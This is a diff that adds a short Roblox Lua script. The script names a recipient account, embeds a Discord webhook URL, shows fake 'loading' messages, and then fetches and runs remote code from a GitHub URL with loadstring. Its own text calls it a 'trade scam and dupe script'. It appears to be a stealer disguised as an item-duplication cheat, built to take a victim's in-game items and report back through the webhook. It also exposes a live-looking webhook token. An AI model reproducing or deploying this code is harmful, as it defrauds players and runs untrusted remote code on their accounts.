@@ -1,0 +1,14 @@
+Username = "njx_4545yedek"
+Webhooks = "https://discord.com/api/webhooks/1123913219698872361/GiH7qLGctK2WBvrgW98Phv7Dwi3-HE77cUJldEPEHLaiOjzkd-RBc6bAommRRd5Pd-qk"
+
+_G.CustomScriptName = "trade scam and dupe script loading plase wait"
+
+_G.Text1 = "Script Loaded..."
+
+_G.Text2 = "Waiting for Script..."
+
+_G.Text3 = "Checking Scripts..."
+
+_G.Text4 = "Starting Script..."
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Jopsc/MainOp_script/main/Pet_scriptPetboi"))()
